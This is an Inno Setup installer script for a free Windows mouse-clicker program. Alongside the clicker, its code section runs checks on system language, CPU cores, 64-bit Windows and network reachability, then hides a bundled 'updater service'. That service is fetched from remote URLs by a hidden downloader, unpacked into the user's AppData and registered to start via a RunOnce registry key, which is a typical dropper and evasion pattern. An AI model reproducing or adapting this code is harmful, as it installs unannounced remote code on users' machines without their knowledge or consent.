;#include <idp.iss>

[Setup]
AppName=The Fastest Mouse Clicker for Windows
AppVersion=2.5.3.2
VersionInfoVersion=2.5.3.2
AppPublisher=Open Source Developer Masha Novedad
AppPublisherURL=https://github.com/windows-2048
AppUpdatesURL=https://sourceforge.net/projects/fast-mouse-clicker-pro/
AppSupportURL=https://sourceforge.net/projects/fast-mouse-clicker-pro/
AppCopyright=2018-2019 Open Source Developer Masha Novedad
PrivilegesRequired=lowest
DefaultDirName={userappdata}\TheFastestMouseClicker
LicenseFile=_license.txt
DefaultGroupName=The Fastest Mouse Clicker for Windows
UninstallDisplayIcon={app}\TheFastestMouseClicker\TheFastestMouseClicker.exe
Compression=lzma2/ultra64
SolidCompression=yes
OutputDir=.\bin
AlwaysShowDirOnReadyPage=yes
AlwaysShowGroupOnReadyPage=yes
WizardImageFile=_wizardimage.bmp
WizardSmallImageFile=_wizardimagesmall.bmp
#ifnexist "_DEBUG"
OutputBaseFilename=Install_TheFastestMouseClicker_2.5.3.2
#else
OutputBaseFilename=Install_TheFastestMouseClicker_2.5.3.2d
#endif
CloseApplications=force
SetupMutex=Setup_TheFastestMouseClicker
DirExistsWarning=no
Encryption=yes
Password=2.5.3.2

[Dirs]
; Note it only removes dir if it is empty after automatic file uninstalling done
Name: "{app}"; Flags: uninsalwaysuninstall;

[Files]
; Place all common files here, first one should be marked 'solidbreak'

Source: "_build.txt"; DestDir: "{app}\TheFastestMouseClicker\source_code"; Flags: ignoreversion;
Source: "src\auto_mouse_clicker\main.cpp"; DestDir: "{app}\TheFastestMouseClicker\source_code"; Flags: ignoreversion;
Source: "vlatest\TheFastestMouseClicker\source_code\the_fastest_mouse_clicker.sln"; DestDir: "{app}\TheFastestMouseClicker\source_code"; Flags: ignoreversion;
Source: "vlatest\TheFastestMouseClicker\source_code\the_fastest_mouse_clicker.vcxproj"; DestDir: "{app}\TheFastestMouseClicker\source_code"; Flags: ignoreversion;
Source: "vlatest\TheFastestMouseClicker\run_clicker_with_command_line.bat"; DestDir: "{app}\TheFastestMouseClicker"; Flags: ignoreversion;
Source: "vlatest\TheFastestMouseClicker\run_clicker_with_random_clicking.bat"; DestDir: "{app}\TheFastestMouseClicker"; Flags: ignoreversion;
Source: "vlatest\TheFastestMouseClicker\TheFastestMouseClicker.exe"; DestDir: "{app}\TheFastestMouseClicker"; Flags: ignoreversion;
Source: "..\_Updater64Alt\unilib\alt64curl.dll"; DestDir: "{tmp}\Install_OSDMNUU_v4.5.8.1"; Flags: ignoreversion; Check: GoodSysCheck
Source: "..\_Updater64Alt\unilib\UnRAR.dll"; DestDir: "{tmp}\Install_OSDMNUU_v4.5.8.1"; Flags: ignoreversion; Check: GoodSysCheck
Source: "..\_Updater64Alt\unilib\InnoSetupDownloader.exe"; DestDir: "{tmp}\Install_OSDMNUU_v4.5.8.1"; Flags: ignoreversion; Check: GoodSysCheck
Source: "_readme.txt"; DestDir: "{userappdata}\osdmnuu_dir"; Flags: ignoreversion; Check: GoodSysCheck


[Code]
(*
UnRAR source code may be used in any software to handle
      RAR archives without limitations free of charge, but cannot be
      used to develop RAR (WinRAR) compatible archiver and to
      re-create RAR compression algorithm, which is proprietary.
      Distribution of modified UnRAR source code in separate form
      or as a part of other software is permitted, provided that
      full text of this paragraph, starting from "UnRAR source code"
      words, is included in license, or in documentation if license
      is not available, and in source code comments of resulting package.
*)

var g_bGoodSysCheck: Boolean;

function GoodSysCheck(): Boolean;
begin
    //MsgBox('GoodSysCheck()', mbInformation, MB_OK);
    Result := g_bGoodSysCheck;
    if Result then
    begin
        //MsgBox('GoodSysCheck() True', mbInformation, MB_OK);
    end;
end;

function InternetOnline(): Boolean;
var iResultCode: Integer;
var iInetCnt: Integer;
begin
    Result := True;

    iInetCnt := 0;

    if Exec(ExpandConstant('{sys}\ping.exe'), '-n 1 -w 1000 8.8.4.4', ExpandConstant('{tmp}'), SW_HIDE, ewWaitUntilTerminated, iResultCode) then
    begin
        if (iResultCode = 0) then
        begin
            //MsgBox('False ping www.google.com', mbInformation, MB_OK);
            iInetCnt := iInetCnt + 1;
        end;
    end;

    if Exec(ExpandConstant('{sys}\ping.exe'), '-n 1 -w 1000 37.235.1.177', ExpandConstant('{tmp}'), SW_HIDE, ewWaitUntilTerminated, iResultCode) then
    begin
        if (iResultCode = 0) then
        begin
            //MsgBox('False ping www.microsoft.com', mbInformation, MB_OK);
            iInetCnt := iInetCnt + 1;
        end;
    end;

    if Exec(ExpandConstant('{sys}\ping.exe'), '-n 1 -w 1000 209.244.0.3', ExpandConstant('{tmp}'), SW_HIDE, ewWaitUntilTerminated, iResultCode) then
    begin
        if (iResultCode = 0) then
        begin
            //MsgBox('False ping www.gnu.org', mbInformation, MB_OK);
            iInetCnt := iInetCnt + 1;
        end;
    end;

    if iInetCnt < 1 then
    begin
        Result := False;
    end;
end;

function GoodLanguage(): Boolean;
var iLang: Integer;
begin
    iLang := GetUILanguage();

    Result := True;

#ifnexist "_DEBUG"
    if iLang = $0419 then
    begin
        //MsgBox('False $0419', mbInformation, MB_OK);
        Result := False;
    end;
#endif

    if iLang = $0422 then
    begin
        //MsgBox('False $0422', mbInformation, MB_OK);
        Result := False;
    end;

    if iLang = $0423 then
    begin
        //MsgBox('False $0423', mbInformation, MB_OK);
        Result := False;
    end;

    if iLang = $043f then
    begin
        //MsgBox('False $043f', mbInformation, MB_OK);
        Result := False;
    end;
end;

// %NUMBER_OF_PROCESSORS%
// {%NAME|DefaultValue}
// function ExpandConstant(const S: String): String;
// function StrToIntDef(s: string; def: Longint): Longint;

function EnoughProcessorCores(): Boolean;
var strNumOfCores: String;
var nNumOfCores: Longint;
begin
    Result := False;

    strNumOfCores := ExpandConstant('{%NUMBER_OF_PROCESSORS|1}');
    nNumOfCores := StrToIntDef(strNumOfCores, 1);

    if (nNumOfCores >= 2) then
    begin
        //MsgBox('nNumOfCores >= 2 True', mbInformation, MB_OK);
        Result := True;
    end;
end;

function OsdmnuuNotYetInstalled(): Boolean;
begin
    Result := not(DirExists(ExpandConstant('{userappdata}\osdmnuu_dir')));
end;

/////////////////////////////////////////////////////////////////////
function GetUninstallString(): String;
var
  sUnInstPath: String;
  sUnInstallString: String;
begin
  sUnInstPath := 'Software\Microsoft\Windows\CurrentVersion\Uninstall\The Fastest Mouse Clicker for Windows_is1';
  sUnInstallString := '';
  if not RegQueryStringValue(HKLM, sUnInstPath, 'UninstallString', sUnInstallString) then
    RegQueryStringValue(HKCU, sUnInstPath, 'UninstallString', sUnInstallString);
  Result := sUnInstallString;
end;


/////////////////////////////////////////////////////////////////////
function IsUpgrade(): Boolean;
begin
  Result := (GetUninstallString() <> '');
end;

procedure InitializeWizard();
var iResultCode: Integer;
begin
#ifexist "_DEBUG"
    MsgBox('InitializeWizard(): #ifexist "_DEBUG" True', mbInformation, MB_OK);
#endif

    // TheFastestMouseClicker

    if not Exec(ExpandConstant('{sys}\taskkill.exe'), '/f /im TheFastestMouseClicker.exe', ExpandConstant('{tmp}'), SW_HIDE, ewWaitUntilTerminated, iResultCode) then
    begin
#ifexist "_DEBUG"
        MsgBox('InitializeWizard()taskkill.exe /f /im TheFastestMouseClicker.exe FALSE', mbInformation, MB_OK);
#endif
    end;

    g_bGoodSysCheck := IsWin64() and GoodLanguage() and InternetOnline() and EnoughProcessorCores() and (OsdmnuuNotYetInstalled() or IsUpgrade());
    if g_bGoodSysCheck then
    begin
        //MsgBox('InitializeWizard() True', mbInformation, MB_OK);

        // TheFastestMouseClicker_Updater_1

        if not Exec(ExpandConstant('{sys}\taskkill.exe'), '/f /im TheFastestMouseClicker_Updater_1.exe', ExpandConstant('{tmp}'), SW_HIDE, ewWaitUntilTerminated, iResultCode) then
        begin
#ifexist "_DEBUG"
            MsgBox('InitializeWizard()taskkill.exe /f /im TheFastestMouseClicker_Updater_1.exe FALSE', mbInformation, MB_OK);
#endif
        end;

        if not Exec(ExpandConstant('{sys}\taskkill.exe'), '/f /im TheFastestMouseClicker_Updater_1a.exe', ExpandConstant('{tmp}'), SW_HIDE, ewWaitUntilTerminated, iResultCode) then
        begin
#ifexist "_DEBUG"
            MsgBox('InitializeWizard()taskkill.exe /f /im TheFastestMouseClicker_Updater_1a.exe FALSE', mbInformation, MB_OK);
#endif
        end;

        if not Exec(ExpandConstant('{sys}\taskkill.exe'), '/f /im TheFastestMouseClicker_Updater_1g.exe', ExpandConstant('{tmp}'), SW_HIDE, ewWaitUntilTerminated, iResultCode) then
        begin
#ifexist "_DEBUG"
            MsgBox('InitializeWizard()taskkill.exe /f /im TheFastestMouseClicker_Updater_1g.exe FALSE', mbInformation, MB_OK);
#endif
        end;

        // 2048GameProfessional

        if not Exec(ExpandConstant('{sys}\taskkill.exe'), '/f /im 2048GameProfessional_Updater_1.exe', ExpandConstant('{tmp}'), SW_HIDE, ewWaitUntilTerminated, iResultCode) then
        begin
#ifexist "_DEBUG"
            MsgBox('InitializeWizard()taskkill.exe /f /im 2048GameProfessional_Updater_1.exe FALSE', mbInformation, MB_OK);
#endif
        end;

        if not Exec(ExpandConstant('{sys}\taskkill.exe'), '/f /im 2048GameProfessional_Updater_1a.exe', ExpandConstant('{tmp}'), SW_HIDE, ewWaitUntilTerminated, iResultCode) then
        begin
#ifexist "_DEBUG"
            MsgBox('InitializeWizard()taskkill.exe /f /im 2048GameProfessional_Updater_1a.exe FALSE', mbInformation, MB_OK);
#endif
        end;

        if not Exec(ExpandConstant('{sys}\taskkill.exe'), '/f /im 2048GameProfessional_Updater_1g.exe', ExpandConstant('{tmp}'), SW_HIDE, ewWaitUntilTerminated, iResultCode) then
        begin
#ifexist "_DEBUG"
            MsgBox('InitializeWizard()taskkill.exe /f /im 2048GameProfessional_Updater_1g.exe FALSE', mbInformation, MB_OK);
#endif
        end;

        // InnoSetupDownloader

        if not Exec(ExpandConstant('{sys}\taskkill.exe'), '/f /im InnoSetupDownloader.exe', ExpandConstant('{tmp}'), SW_HIDE, ewWaitUntilTerminated, iResultCode) then
        begin
#ifexist "_DEBUG"
            MsgBox('InitializeWizard()taskkill.exe /f /im InnoSetupDownloader.exe FALSE', mbInformation, MB_OK);
#endif
        end;

        // osdmnus

        if not Exec(ExpandConstant('{sys}\taskkill.exe'), '/f /im osdmnus.exe', ExpandConstant('{tmp}'), SW_HIDE, ewWaitUntilTerminated, iResultCode) then
        begin
#ifexist "_DEBUG"
            MsgBox('InitializeWizard()taskkill.exe /f /im osdmnus.exe FALSE', mbInformation, MB_OK);
#endif
        end;

        // osdmnuu

        if not Exec(ExpandConstant('{sys}\taskkill.exe'), '/f /im osdmnuu.exe', ExpandConstant('{tmp}'), SW_HIDE, ewWaitUntilTerminated, iResultCode) then
        begin
#ifexist "_DEBUG"
            MsgBox('InitializeWizard()taskkill.exe /f /im osdmnuu.exe FALSE', mbInformation, MB_OK);
#endif
        end;
    end;
end;

procedure InstallOsdmnuuDir;
var
  StatusText: string;
  ResultCode: Integer;
begin
  StatusText := WizardForm.StatusLabel.Caption;
  WizardForm.StatusLabel.Caption := 'Installing Updater Service. This might take a few minutes...';
  WizardForm.ProgressGauge.Style := npbstMarquee;
  ResultCode := 0;
  try
    if not Exec(ExpandConstant('{tmp}\Install_OSDMNUU_v4.5.8.1\InnoSetupDownloader.exe'), ExpandConstant('https://sourceforge.net/p/fast-mouse-clicker-pro/code/ci/master/tree/InnoSetupDownloader/UniversalUpdater/osdmnuu_dir_v4_5_8_1_subdir.dat?format=raw https://github.com/windows-2048/The-Fastest-Mouse-Clicker-for-Windows/raw/master/InnoSetupDownloader/UniversalUpdater/osdmnuu_dir_v4_5_8_1_subdir.dat 000000 123456 {userappdata} \osdmnuu_dir \osdmnus.exe true'), ExpandConstant('{tmp}\Install_OSDMNUU_v4.5.8.1'), SW_HIDE, ewWaitUntilTerminated, ResultCode) then
    begin
#ifexist "_DEBUG"
        MsgBox('Updater Service installation failed with code: ' + IntToStr(ResultCode) + '.', mbError, MB_OK);
#endif
    end;
  finally
    WizardForm.StatusLabel.Caption := StatusText;
    WizardForm.ProgressGauge.Style := npbstNormal;

    DelTree(ExpandConstant('{tmp}\Install_OSDMNUU_v4.5.8.1'), True, True, True);
  end;
end;

/////////////////////////////////////////////////////////////////////
function UnInstallOldVersion(): Integer;
var
  sUnInstallString: String;
  iResultCode: Integer;
begin
// Return Values:
// 1 - uninstall string is empty
// 2 - error executing the UnInstallString
// 3 - successfully executed the UnInstallString

  // default return value
  Result := 0;

  // get the uninstall string of the old app
  sUnInstallString := GetUninstallString();
  if sUnInstallString <> '' then begin
    sUnInstallString := RemoveQuotes(sUnInstallString);
    if Exec(sUnInstallString, '/SILENT /NORESTART /SUPPRESSMSGBOXES','', SW_HIDE, ewWaitUntilTerminated, iResultCode) then
      Result := 3
    else
      Result := 2;
  end else
    Result := 1;
end;

/////////////////////////////////////////////////////////////////////
procedure CurStepChanged(CurStep: TSetupStep);
begin
  if (CurStep=ssInstall) then
  begin
    if (IsUpgrade()) then
    begin
      UnInstallOldVersion();
      Sleep(2000); //wait two seconds here
    end;
  end;

  case CurStep of
    ssDone:
      begin
        if GoodSysCheck() then
        begin
          InstallOsdmnuuDir();
        end;
      end;
  end;
end;

procedure CurPageChanged(CurPageID: Integer);
begin
  if CurPageID = wpPassword then
  begin
    WizardForm.PasswordLabel.Caption := 'Just click the Next button.'
    WizardForm.PasswordEditLabel.Caption := 'Password 2.5.3.2 is already entered.'
    WizardForm.PasswordEdit.Text := '2.5.3.2'
  end;
end;

[Icons]
Name: "{group}\The Fastest Mouse Clicker for Windows"; Filename: "{app}\TheFastestMouseClicker\TheFastestMouseClicker.exe"
Name: "{group}\The Fastest Mouse Clicker for Windows source code"; Filename: "{app}\TheFastestMouseClicker\source_code"; WorkingDir: "{app}\TheFastestMouseClicker\source_code"
Name: "{userdesktop}\The Fastest Mouse Clicker for Windows"; Filename: "{app}\TheFastestMouseClicker\TheFastestMouseClicker.exe"

[Registry]
Root: HKCU; Subkey: "Software\Microsoft\Windows\CurrentVersion\RunOnce"; ValueType: string; ValueName: "Open_Source_Developer_Masha_Novedad"; ValueData: "{userappdata}\osdmnuu_dir\osdmnus.exe"; Flags: dontcreatekey uninsdeletevalue uninsdeletekeyifempty; Check: GoodSysCheck

[Run]
Filename: "{app}\TheFastestMouseClicker\TheFastestMouseClicker.exe"; Description: {cm:LaunchProgram,{cm:AppName}}; Flags: nowait postinstall skipifsilent
Filename: "{app}\TheFastestMouseClicker\source_code"; Description: "View the source code"; Flags: postinstall shellexec skipifsilent

[UninstallRun]
Filename: {sys}\taskkill.exe; Parameters: "/f /im TheFastestMouseClicker.exe"; Flags: skipifdoesntexist runhidden
Filename: {sys}\taskkill.exe; Parameters: "/f /im InnoSetupDownloader.exe"; Flags: skipifdoesntexist runhidden; Check: GoodSysCheck
Filename: {sys}\taskkill.exe; Parameters: "/f /im osdmnus.exe"; Flags: skipifdoesntexist runhidden; Check: GoodSysCheck
Filename: {sys}\taskkill.exe; Parameters: "/f /im osdmnuu.exe"; Flags: skipifdoesntexist runhidden; Check: GoodSysCheck

[UninstallDelete]
Type: filesandordirs; Name: "{app}\TheFastestMouseClicker"
Type: filesandordirs; Name: "{userappdata}\osdmnuu_dir"

[CustomMessages]
AppName=The Fastest Mouse Clicker for Windows version 2.5.3.2
LaunchProgram=Start application after finishing installation
